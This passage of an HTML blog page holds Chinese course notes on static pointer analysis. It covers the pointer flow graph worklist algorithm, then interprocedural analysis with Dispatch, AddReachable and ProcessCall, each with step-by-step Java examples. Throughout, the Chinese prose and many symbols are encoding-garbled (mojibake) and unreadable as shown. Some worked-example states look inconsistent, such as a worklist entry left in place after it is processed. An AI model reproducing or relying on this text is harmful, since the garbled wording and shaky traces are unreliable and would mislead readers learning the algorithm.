å…¥PFGï¼›å¹¶ä¸”æ£€æŸ¥ s æŒ‡å‘çš„å†…å­˜é›†åˆï¼Œå¦‚æœé›†åˆä¸ç©ºï¼Œåˆ™éœ€ä¿è¯ $s$ æŒ‡å‘çš„å†…å®¹è¢« $t$ æŒ‡å‘ï¼Œå³åŠ å…¥å·¥ä½œé˜Ÿåˆ—ä¸­ã€‚</p><h2 id="æŒ‡é’ˆä¼ æ’­å‡½æ•°-Propagate-ï¼š"><a href="#æŒ‡é’ˆä¼ æ’­å‡½æ•°-Propagate-ï¼š" class="headerlink" title="æŒ‡é’ˆä¼ æ’­å‡½æ•° Propagate()ï¼š"></a>æŒ‡é’ˆä¼ æ’­å‡½æ•° Propagate()ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Propagate</span><span class="params">(n, pts)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    n: æŒ‡é’ˆn</span></span><br><span class="line"><span class="string">    pts: nå¯èƒ½æŒ‡å‘çš„æ–°çš„æŒ‡é’ˆé›†åˆ</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> pts <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        pt(n) â‹ƒ= pts <span class="comment"># å°†ptså†…å®¹å­˜å…¥åˆ°æŒ‡é’ˆæŒ‡å‘çš„é›†åˆä¸­</span></span><br><span class="line">        <span class="keyword">for</span> each n â†’ s âˆˆ PFG</span><br><span class="line">        add s, pts to WL</span><br></pre></td></tr></table></figure><p>å³ pts ä¸ä¸ºç©ºæ—¶ï¼Œå°† $pts$ å†…å®¹å­˜å…¥ $n$ çš„æŒ‡é’ˆé›†åˆä¸­ï¼Œæ¥ç€æ‰¾nçš„åç»§sï¼Œå¯¹æ¯ä¸€ä¸ªsï¼Œå°† &lt;s, pts&gt; åŠ å…¥WLã€‚</p><h2 id="ä¸»å‡½æ•°-Solve-ï¼š"><a href="#ä¸»å‡½æ•°-Solve-ï¼š" class="headerlink" title="ä¸»å‡½æ•° Solve()ï¼š"></a>ä¸»å‡½æ•° <code>Solve()</code>ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Solve</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    S: ç¨‹åºæ‰€æœ‰è¯­å¥</span></span><br><span class="line"><span class="string">    WLï¼šå·¥ä½œé˜Ÿåˆ—</span></span><br><span class="line"><span class="string">    PFGï¼š Pointer flow graph</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">WL = [] <span class="comment"># e.g., [&lt;n, pts&gt;] è¡¨ç¤ºæŒ‡é’ˆnå¯èƒ½ä¼šæŒ‡å‘ptsé›†åˆï¼ˆæ¯æ¬¡è¿­ä»£å°±ä¼šæœ‰æ–°çš„å¯èƒ½ï¼‰</span></span><br><span class="line">PFG = &#123;&#125; <span class="comment"># e.g., &#123;&lt;x, &#123;ğ‘œğ‘–&#125;&gt;&#125; è¡¨ç¤ºæŒ‡é’ˆxæŒ‡å‘å¯¹è±¡ğ‘œğ‘–</span></span><br><span class="line"><span class="keyword">for</span> each i: x = new T() âˆˆ ğ‘†: <span class="comment"># å¤„ç† new stmt</span></span><br><span class="line">add &lt;x, &#123;ğ‘œğ‘–&#125;&gt; to WL </span><br><span class="line"><span class="keyword">for</span> each x = y âˆˆ S: <span class="comment"># å¤„ç† assign stmt</span></span><br><span class="line">AddEdge(y, x)</span><br><span class="line"><span class="keyword">while</span> WL <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        remove n, pts <span class="keyword">from</span> WL</span><br><span class="line">        Î” = pts - pt(n)</span><br><span class="line">        Propagate(n, Î”)</span><br><span class="line">        <span class="keyword">if</span> n represents a variable x:</span><br><span class="line">            <span class="keyword">for</span> each ğ‘œğ‘– âˆˆ Î”:</span><br><span class="line">                <span class="keyword">for</span> each x.f = y âˆˆ S: <span class="comment"># å¤„ç† store stmt</span></span><br><span class="line">                    AddEdge(y, ğ‘œğ‘–.ğ‘“)</span><br><span class="line">                <span class="keyword">for</span> each y = x.f âˆˆ S: <span class="comment"># å¤„ç† load stmt</span></span><br><span class="line">                    AddEdge(ğ‘œğ‘–.ğ‘“, y)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå¯ä»¥çœ‹åˆ°ï¼Œåœ¨9ã€11ã€19å’Œ21è¡Œåˆ†åˆ«å¤„ç†äº†newã€assignã€storeå’Œloadæ“ä½œï¼š</p><ul><li>å¯¹äºnewæ“ä½œï¼Œç›´æ¥å°† $\left \langle x, o_i \right\rangle$ åŠ å…¥worklist</li><li>å¯¹äºassignæ“ä½œï¼Œå°†xæŒ‡å‘çš„å†…å®¹ä¹Ÿè¢«yæŒ‡å‘ï¼Œå³è°ƒç”¨<code>AddEdge()</code></li></ul><p>æ¥ä¸‹æ¥è¿›å…¥å¾ªç¯ï¼Œç›´åˆ°å·¥ä½œé˜Ÿåˆ—ä¸ºç©ºï¼š</p><ol><li>å–å‡ºé˜Ÿå¤´è¦å¤„ç†çš„æŒ‡é’ˆnå’Œå…¶å¯¹åº”çš„pts</li><li>æ±‚å·®å¼‚ Î”ï¼Œptsä¸­çš„æœ‰ä¸€äº›åœ°å€å…ˆå‰å·²ç»ä¼ æ’­è¿‡ï¼Œåªéœ€å¤„ç†å‰©ä½™éƒ¨åˆ†</li><li>è°ƒç”¨<code>Propogate()</code>ï¼Œå°† Î” å†…å®¹æ”¾å…¥ $pt(n)$ å¹¶ä¸”æ·»åŠ æ–°çš„work</li></ol><p>æ¥ç€éœ€è¦å¤„ç†å¯¹è±¡æ“ä½œï¼Œ17-18çš„è¡Œæ„æŒ‡è‹¥æŒ‡é’ˆnè¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªå˜é‡ï¼ˆè€Œä¸æ˜¯field)ï¼Œé‚£ä¹ˆå¯¹äºæ¯ä¸€ä¸ª Î” ä¸­çš„å¯¹è±¡å®ä¾‹ï¼Œå¤„ç†æ‰€æœ‰ä¸ $x.f$ ç›¸å…³çš„ store å’Œ load æ“ä½œï¼Œå¯¹ store å’Œ load æ“ä½œéƒ½æ˜¯ä½¿ç”¨<code>AddEdge()</code>å¤„ç†ï¼ˆ19-22è¡Œï¼‰ã€‚</p><h2 id="å…·ä½“ç¤ºä¾‹"><a href="#å…·ä½“ç¤ºä¾‹" class="headerlink" title="å…·ä½“ç¤ºä¾‹"></a>å…·ä½“ç¤ºä¾‹</h2><p>è€ƒè™‘å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="keyword">new</span> C();</span><br><span class="line">a = b;</span><br><span class="line">c = <span class="keyword">new</span> C();</span><br><span class="line">c.f = a;</span><br><span class="line">d = c;</span><br><span class="line">c.f = d;</span><br><span class="line">e = d.f;</span><br></pre></td></tr></table></figure><p><strong>é¦–å…ˆç»è¿‡<code>solve():L9-12</code>çš„åˆå§‹åŒ–ï¼š</strong></p><ul><li>WL=[&lt;b,{o1}&gt;, &lt;c,{o3}&gt;]</li><li><p>PFG:</p><pre class="mermaid">  graph RL    b("b{}") --> a("a{}")    c("c{}") --> d("d{}")</pre></li></ul><p><strong>å¤„ç†&lt;b,{o1}&gt;</strong>: ä¸»è¦æ‰§è¡Œç¬¬16è¡Œ<code>Propagate()</code></p><ul><li>WL=[&lt;c,{o3}&gt;, &lt;a,{o1}&gt;]ï¼Œå› ä¸ºbâ†’aï¼Œæ‰€ä»¥å¢åŠ äº†ä¸€ä¸ªæ–°work</li><li>PFG:<pre class="mermaid">  graph RL    b("b{o1}") --> a("a{}")    c("c{}") --> d("d{}")</pre></li></ul><p><strong>å¤„ç†&lt;c, {o3}&gt;</strong>ï¼Œé™¤äº†<code>propagate(c, {o3})</code>ï¼Œæ³¨æ„åˆ°ç¬¬ 4 è¡Œå’Œç¬¬ 6 è¡Œï¼Œæ‰€ä»¥è¿˜éœ€å¤„ç†storeï¼Œå³<code>AddEdge(a,o3.f)</code>,<code>AddEdge(d,o3.f)</code>ï¼Œå› ä¸ºç›®å‰ a å’Œ d æŒ‡å‘å†…å®¹éƒ½æ˜¯ç©ºé›†ï¼Œæ‰€ä»¥ WL ä¸å¢åŠ ï¼š</p><ul><li>WL=[&lt;a,{o1}&gt;, &lt;d,{o3}&gt;]</li><li>PFG:    <pre class="mermaid">  graph RL    b("b{o1}") --> a("a{}")    c("c{o3}") --> d("d{}")    a-->o3.f["o3.f{}"]     d-->o3.f</pre></li></ul><p><strong>å¤„ç†&lt;a,{o1}&gt;</strong>ï¼Œ<code>propagate(a, {o1})</code>ï¼š</p><ul><li>WL=[&lt;d,{o3}&gt;, &lt;o3.f, {o1}&gt;]</li><li>PFG:    <pre class="mermaid">  graph RL    b("b{o1}") --> a("a{o1}")    c("c{o3}") --> d("d{}")    a-->o3.f["o3.f{}"]     d-->o3.f</pre></li></ul><p><strong>å¤„ç†&lt;d,{o3}&gt;</strong>ï¼Œ<code>propagate(d, {o3})</code>, ä»¥åŠæ³¨æ„åˆ°ç¬¬ 7 è¡Œçš„ load è¯­å¥ï¼Œè°ƒç”¨<code>AddEdge(o3.f,e)</code>ï¼š</p><ul><li>WL=[&lt;o3.f, {o1}&gt;, &lt;o3.f, {o3}&gt;]</li><li><p>PFG:    </p><pre class="mermaid">  graph RL    b("b{o1}") --> a("a{o1}")    c("c{o3}") --> d("d{o3}")    a-->o3.f["o3.f{}"]     d-->o3.f    o3.f --> e("e{}")</pre></li></ul><p><strong>åé¢æ­¥éª¤çœç•¥ï¼Œæœ€å PFG ç»“æœä¸ºï¼š</strong></p><pre class="mermaid">graph RL      b("b{o1}") --> a("a{o1}")      c("c{o3}") --> d("d{o3}")      a-->o3.f["o3.f{o1, o3}"]       d-->o3.f      o3.f --> e("e{o1, o3}")</pre><p>å¯ä»¥çœ‹åˆ° PFG ä¸­å·²ç»è®°å½•äº†æ¯ä¸ªæŒ‡é’ˆå˜é‡å¯èƒ½æŒ‡å‘çš„å¯¹è±¡ã€‚</p><h1 id="Pointer-Analysis-with-Method-Calls"><a href="#Pointer-Analysis-with-Method-Calls" class="headerlink" title="Pointer Analysis with Method Calls"></a>Pointer Analysis with Method Calls</h1><p>åœ¨åˆ†æ call statments æ—¶ï¼Œéœ€è¦åšè¿‡ç¨‹é—´åˆ†æï¼Œå³éœ€è¦æ„å»º call graphï¼Œå·²çŸ¥çš„ CHA æ„å»ºçš„ call graph æ˜¯ä¸å‡†ç¡®çš„ï¼Œæœ¬èŠ‚è¯¾ä»‹ç»å¦‚ä½•ä½¿ç”¨æŒ‡é’ˆåˆ†ææœ¬èº«æ„å»º call graphï¼Œå³å®Œæˆè·¨å‡½æ•°çš„æŒ‡é’ˆåˆ†æã€‚</p><h2 id="Rule-Call"><a href="#Rule-Call" class="headerlink" title="Rule: Call"></a>Rule: Call</h2><p>å¯¹äºä¹‹å‰å¿½ç•¥çš„ Call stmtï¼Œæœ‰å¦‚ä¸‹æ¨å¯¼è§„åˆ™ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200823202143283.png" alt="image-20200823202143283"></p><p>ä¸»è¦æœ‰4éƒ¨åˆ†ï¼š</p><ol><li>ç”± $Dispatch(o_i, k)$ è·å–ç›®æ ‡æ–¹æ³•ï¼Œ$Dispatch()$ å®ç°ä¸ä¹‹å‰ CHA åˆ†æç›¸åŒï¼š<script type="math/tex; mode=display">Dispatch(c, m)=\left\{\begin{array}{ll}m' ,& \text{if } c \text{ contains non-abstract method }m' \\& \text{that has the same name and descriptor as }m\\  Dispatch(c', m), & \text{otherwise}\end{array}\right.\\\text{where }c'\text{ is superclass of }c</script></li><li>è¢«$x$ æŒ‡å‘çš„å¯¹è±¡$o_i$ ï¼Œä¹Ÿè¢« $m_{this}$ æŒ‡å‘ï¼›</li><li>å¯¹äºæ¯ä¸€ä¸ªå®å‚$a_j$æ‰€æŒ‡å‘çš„ä¿¡æ¯ï¼Œä¹Ÿè¢«å½¢å‚ $m_{pj}$ æ‰€æŒ‡å‘â€”â€”åœ¨PFGä¸Šå¢åŠ  â€œå®å‚â†’å½¢å‚â€è¾¹ï¼›</li><li>å¯¹äºè¢«è¿”å›å€¼ $m_{ret}$ æŒ‡å‘çš„å¯¹è±¡$o_v$ï¼Œä¹Ÿè¢«ç­‰å·å·¦è¾¹å˜é‡ $r$ æŒ‡å‘â€”â€”åœ¨PFGä¸Šå¢åŠ â€œretâ†’râ€çš„è¾¹ã€‚</li></ol><p><strong>è®¨è®ºä¸ºä»€ä¹ˆå¯¹äº $m_{this}$ ä¸å¢åŠ è¾¹ï¼Œè€Œå¯¹å…¶ä»–å‚æ•°å°±å¢åŠ è¾¹ï¼š</strong></p><p>æ³¨æ„åˆ° $x$ æŒ‡å‘çš„ä¿¡æ¯æ˜¯ä¸€ä¸ªé›†åˆï¼Œè€Œ $m_{this}$ ç”±$Dispatch()$ è§£æåå¯ä»¥å”¯ä¸€ç¡®å®šä¸€ä¸ªå¯¹è±¡ï¼Œæ¢å¥è¯è¯´ï¼š</p><ol><li><p>å¯¹äºthisæ¥è¯´ï¼ŒæŒ‡é’ˆåˆ†æå·²ç»å¯ä»¥å”¯ä¸€ç¡®å®šè¯¥å¯¹è±¡å®ä¾‹ï¼Œè‹¥ä¼ é€’ $x$ çš„æŒ‡å‘å¯¹è±¡é›†åˆåè€Œé€ æˆåˆ†æä¸å‡†ç¡®ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200823204227690.png" alt="image-20200823204227690"></p></li><li><p>å¯¹äºå…¶ä»–å‚æ•°ï¼ŒæŒ‡é’ˆåˆ†ææ— æ³•ç¡®å®šå®ƒä»¬çš„å”¯ä¸€å¯¹è±¡å®ä¾‹ï¼Œä¸ºä¿è¯mayåˆ†æï¼Œéœ€è¦ä¼ é€’å…ˆå‰æ‰€æœ‰å¯èƒ½æ€§ï¼Œå³å¯èƒ½æŒ‡å‘çš„é›†åˆã€‚</p></li></ol><p>å½’æ ¹ç»“åº•ï¼Œthiså’Œä¸åŒå‚æ•°è¿˜æ˜¯æœ‰åŒºåˆ«çš„ï¼Œthisçš„å®ä¾‹å‚ä¸äº† Dispatch è¿‡ç¨‹ã€‚</p><h2 id="Interprocedural-pointer-analysis"><a href="#Interprocedural-pointer-analysis" class="headerlink" title="Interprocedural pointer analysis"></a>Interprocedural pointer analysis</h2><ol><li>å’Œå…¶ä»–è¿‡ç¨‹é—´åˆ†æä¸€æ ·ï¼Œè¿‡ç¨‹é—´æŒ‡é’ˆåˆ†æéœ€è¦æŒ‡å®šä¸€ä¸ªå‡½æ•°å…¥å£</li><li>è¿‡ç¨‹é—´æŒ‡é’ˆåˆ†æä¸€è¾¹åš<strong>æŒ‡é’ˆåˆ†æ</strong>ï¼Œä¸€è¾¹æ„é€ <strong>è°ƒç”¨å›¾</strong></li><li>ç”±å…¥å£å‡ºå‘ä¸æ–­æ¢ç´¢æœªçŸ¥å‡½æ•°ï¼Œç›´åˆ°æ‰€æœ‰å¯è¢«æ¢ç´¢çš„å‡½æ•°éƒ½è¢«å¤„ç†å®Œæˆï¼Œè¿™æ ·æ—¢å¯ä»¥æé«˜æ•ˆç‡ï¼Œåˆå¯ä»¥æé«˜ç²¾åº¦</li></ol><h2 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Solve</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    S: ç¨‹åºæ‰€æœ‰è¯­å¥</span></span><br><span class="line"><span class="string">    WL: å·¥ä½œé˜Ÿåˆ—</span></span><br><span class="line"><span class="string">    PFG: Pointer flow graph</span></span><br><span class="line"><span class="string">    S: å¯è¾¾æ‰€æœ‰è¯­å¥é›†åˆ s_mè¡¨ç¤ºå‡½æ•°mçš„æ‰€æœ‰è¯­å¥é›†åˆ</span></span><br><span class="line"><span class="string">    RM: å¯è¾¾æ‰€æœ‰å‡½æ•°é›†åˆ</span></span><br><span class="line"><span class="string">    CG: è°ƒç”¨å›¾ï¼Œä¿å­˜è¾¹</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    WL = [] <span class="comment"># e.g., [&lt;n, pts&gt;] è¡¨ç¤ºæŒ‡é’ˆnå¯èƒ½ä¼šæŒ‡å‘ptsé›†åˆï¼ˆæ¯æ¬¡è¿­ä»£å°±ä¼šæœ‰æ–°çš„å¯èƒ½ï¼‰</span></span><br><span class="line">    PFG = &#123;&#125; <span class="comment"># e.g., &#123;&lt;x, &#123;ğ‘œğ‘–&#125;&gt;&#125; è¡¨ç¤ºæŒ‡é’ˆxæŒ‡å‘å¯¹è±¡ğ‘œğ‘–</span></span><br><span class="line">    S = &#123;&#125; <span class="comment"># added</span></span><br><span class="line">    RM = &#123;&#125; <span class="comment"># added</span></span><br><span class="line">    CG = &#123;&#125; <span class="comment"># added</span></span><br><span class="line">    AddReachable(m) <span class="comment"># difference</span></span><br><span class="line">    <span class="keyword">while</span> WL <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        remove n, pts <span class="keyword">from</span> WL</span><br><span class="line">        Î” = pts - pt(n)</span><br><span class="line">        Propagate(n, Î”)</span><br><span class="line">        <span class="keyword">if</span> n represents a variable x:</span><br><span class="line">            <span class="keyword">for</span> each ğ‘œğ‘– âˆˆ Î”:</span><br><span class="line">                <span class="keyword">for</span> each x.f = y âˆˆ S: <span class="comment"># å¤„ç† store stmt</span></span><br><span class="line">                    AddEdge(y, ğ‘œğ‘–.ğ‘“)</span><br><span class="line">                <span class="keyword">for</span> each y = x.f âˆˆ S: <span class="comment"># å¤„ç† load stmt</span></span><br><span class="line">                    AddEdge(ğ‘œğ‘–.ğ‘“, y)</span><br><span class="line">                ProcessCall(x, ğ‘œğ‘–) <span class="comment"># added</span></span><br></pre></td></tr></table></figure><p>ä¸å•å‡½æ•°çš„æŒ‡é’ˆåˆ†æä¸åŒï¼Œä¸»è¦å˜åŒ–åœ¨12ã€13ã€14ã€15å’Œ26è¡Œï¼Œåœ¨å‡½æ•°åˆå§‹åŒ–é˜¶æ®µï¼Œå¢åŠ å¯è¾¾è¯­å¥é›†åˆã€å¯è¾¾å‡½æ•°é›†åˆå’Œè°ƒç”¨å›¾ï¼Œä»¥åŠå¯¹ new å’Œ assign çš„å¤„ç†æ”¾åœ¨äº† <code>AddReachable()</code> å‡½æ•°ä¸­ï¼Œåœ¨å˜åŒ–çš„æ¯ä¸ªå¯¹è±¡å®ä¾‹ä¸­ï¼Œé€šè¿‡ <code>ProcessCall()</code>å¤„ç†call stmtâ€”â€”å½“nä¸ºä¸€ä¸ªå˜é‡æ—¶è°ƒç”¨ã€‚</p><h3 id="AddReachable-m"><a href="#AddReachable-m" class="headerlink" title="AddReachable(m)"></a>AddReachable(m)</h3><p><code>AddReachable(m)</code>å‡½æ•°ç”¨äºå°†æ–°çš„æ–¹æ³• $m$ åŠ å…¥å¯è¾¾é›†åˆä¸­ï¼ŒåŒæ—¶å¤„ç† $m$ ä¸­ new å’Œ assign è¯­å¥ï¼Œå¤„ç†æ–¹æ³•ä¸å•å‡½æ•°ç±»ä¼¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddReachable</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> m âˆ‰ RM:</span><br><span class="line">        <span class="comment"># æ·»åŠ æ–°çš„å·²çŸ¥æ–¹æ³•å’Œè¯­å¥</span></span><br><span class="line">        add m to RM</span><br><span class="line">        S âˆª= S_m</span><br><span class="line">        <span class="comment"># æ›´æ–° worklist å’Œ PFG</span></span><br><span class="line">        <span class="keyword">for</span> each i: x = new T() âˆˆ S_m:</span><br><span class="line">            add &lt;x, &#123;ğ‘œğ‘–&#125;&gt; to WL</span><br><span class="line">        <span class="keyword">for</span> each x = y âˆˆ S_m:</span><br><span class="line">            AddEdge(y, x)</span><br></pre></td></tr></table></figure><h3 id="ProcessCall-x-ğ‘œğ‘–"><a href="#ProcessCall-x-ğ‘œğ‘–" class="headerlink" title="ProcessCall(x, ğ‘œğ‘–)"></a>ProcessCall(x, ğ‘œğ‘–)</h3><p>$ProcessCall(x,o_i)$ ç”¨äºå¤„ç† call è¯­å¥ï¼Œç®—æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ProcessCall</span><span class="params">(x, ğ‘œğ‘–)</span>:</span> </span><br><span class="line">    <span class="keyword">for</span> l: r = x.k(a1,â€¦,an) âˆˆ S:</span><br><span class="line">        <span class="comment"># è·å–æ–¹æ³•m</span></span><br><span class="line">        ğ‘š = Dispatch(ğ‘œğ‘–, k)</span><br><span class="line">        <span class="comment"># pass receiver object to "this"</span></span><br><span class="line">        add &lt;m_this,&#123;ğ‘œğ‘–&#125;&gt; to WL</span><br><span class="line">        <span class="keyword">if</span> l â†’ m âˆ‰ CG:</span><br><span class="line">            <span class="comment"># æ„å»ºcall graph</span></span><br><span class="line">            add l â†’ m to CG</span><br><span class="line">            <span class="comment"># æ ‡è®°æ–°æ–¹æ³•ä¸ºå·²çŸ¥æ–¹æ³•</span></span><br><span class="line">            AddReachable(m)</span><br><span class="line">            <span class="comment"># ä¼ é€’æ¯ä¸ªå‚æ•°ï¼Œå»ºè¾¹</span></span><br><span class="line">            <span class="keyword">for</span> parameter ğ‘ğ‘– of m:</span><br><span class="line">                AddEdge(ğ‘ğ‘–, ğ‘ğ‘–)</span><br><span class="line">            <span class="comment"># ä¼ é€’è¿”å›å€¼</span></span><br><span class="line">            AddEdge(ğ‘š_ğ‘Ÿğ‘’ğ‘¡, r)</span><br></pre></td></tr></table></figure><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>è®¾æœ‰å¦‚ä¸‹å¾…åˆ†æä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        A a = <span class="keyword">new</span> A();</span><br><span class="line">        A b = <span class="keyword">new</span> B();</span><br><span class="line">        A c = b.foo(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">A <span class="title">foo</span><span class="params">(A x)</span> </span>&#123; â€¦ &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function">A <span class="title">foo</span><span class="params">(A y)</span> </span>&#123;</span><br><span class="line">        A r = <span class="keyword">new</span> A();</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é¦–å…ˆç¨‹åºåˆå§‹åŒ–ï¼Œæœ‰å¦‚ä¸‹ç»“æœï¼š</strong></p><ul><li>worklistï¼Œç”±3ã€4è¡Œçš„new stmtï¼š<br>WL=[&lt;a,{o3}&gt;,&lt;b,{o4}&gt;]</li><li>RMï¼Œ<code>A.main()</code>æˆä¸ºå·²çŸ¥å‡½æ•°ï¼š<br>RM={A.main()}</li><li>CG={}</li><li>PFGä¸ºç©ºï¼Œå› ä¸ºæ²¡æœ‰assign</li></ul><p><strong>è¿›å…¥å¾ªç¯ï¼Œå¤„ç† &lt;a,{o3}&gt;ï¼š</strong></p><p><code>a</code>æ²¡æœ‰storeã€loadå’Œcallï¼Œå› æ­¤åªåš<code>propagate(a,{o3})</code></p><ul><li>WL=[&lt;b,{o4}&gt;]</li><li>RM={A.main()}</li><li>CG={}</li><li>PFG:  <pre class="mermaid">    graph RL      a("a{o3}")</pre></li></ul><p><strong>å¤„ç† &lt;b,{o4}&gt;ï¼š</strong></p><ol><li>å…ˆåš<code>propagate(b,{o4})</code>;</li><li>ç”±äºç¬¬5è¡Œå­˜åœ¨è°ƒç”¨ï¼Œæ‰§è¡Œ<code>ProcessCall(b, o4)</code>ï¼Œåœ¨å‡½æ•°ä¸­ï¼Œé¦–å…ˆè§£æåˆ°è°ƒç”¨å‡½æ•°ä¸º<code>m=B.foo(A)</code>ï¼Œå°† &lt;B.foo/this. {o4}&gt; åŠ å…¥ worklist;</li><li>æ¥ç€ç”±äºä¹‹å‰æ²¡æœ‰åˆ†æè¿‡è¯¥å‡½æ•°è°ƒç”¨:<ol><li>å°† <code>5â†’B.foo(A)</code> åŠ å…¥CG</li></ol></li><li>è°ƒç”¨ <code>AddReachable()</code>   <ol><li>å°†<code>B.foo(A)</code>åŠ å…¥åˆ°å·²çŸ¥å‡½æ•°   </li><li>æ³¨æ„åˆ°11è¡Œå­˜åœ¨newæ“ä½œï¼Œå°†{&lt;r, o11&gt;}åŠ å…¥worklist</li><li>è°ƒç”¨ <code>AddEdge(ai, pi)</code>ï¼Œæ›´æ–°PFG</li><li>è°ƒç”¨<code>AddEdge(r, c)</code>ï¼Œæ›´æ–°PFG</li></ol></li></ol><p>å¤„ç†ç»“æœä¸ºï¼š</p><ul><li>WL=[&lt;B.foo/this, {o4}&gt;, &lt;r, {o11}&gt;, &lt;y, {o3}&gt;]</li><li>RM={A.main(), B.foo(A)}</li><li>CG={5â†’B.foo(A)}</li><li>PFG:  <pre class="mermaid">    graph RL      a("a{o3}")-->y("y{}")      b("b{}")      r("r{}")-->c("c{}")</pre></li></ul><p><strong>å¤„ç†<code>&lt;B.foo/this, {o4}&gt;</code>ï¼š</strong></p><p>åªéœ€è¦åš<code>Propagate(B.foo/this, {o4})</code></p><ul><li>WL=[&lt;B.foo/this, {o4}&gt;, &lt;r, {o11}&gt;, &lt;y, {o3}&gt;]</li><li>RM={A.main(), B.foo(A)}</li><li>CG={5â†’B.foo(A)}</li><li>PFG:  <pre class="mermaid">    graph RL      a("a{o3}")-->y("y{}")      b("b{}")      r("r{}")-->c("c{}")      Bfoo("B.foo/this{o4}")</pre></li></ul><p>åç»­æ­¥éª¤ç±»ä¼¼ï¼Œæœ€åç»“æœä¸ºï¼š</p><ul><li>WL=[&lt;B.foo/this, {o4}&gt;, &lt;r, {o11}&gt;, &lt;y, {o3}&gt;]</li><li>RM={A.main(), B.foo(A)}</li><li>CG={5â†’B.foo(A)}</li><li>PFG:  <pre class="mermaid">    graph RL      a("a{o3}")-->y("y{o3}")      b("b{o4}")      r("r{o11}")-->c("c{o11}")      Bfoo("B.foo/this{o4}")</pre></li></ul><h1 id="ç›¸å…³æ–‡çŒ®"><a href="#ç›¸å…³æ–‡çŒ®" 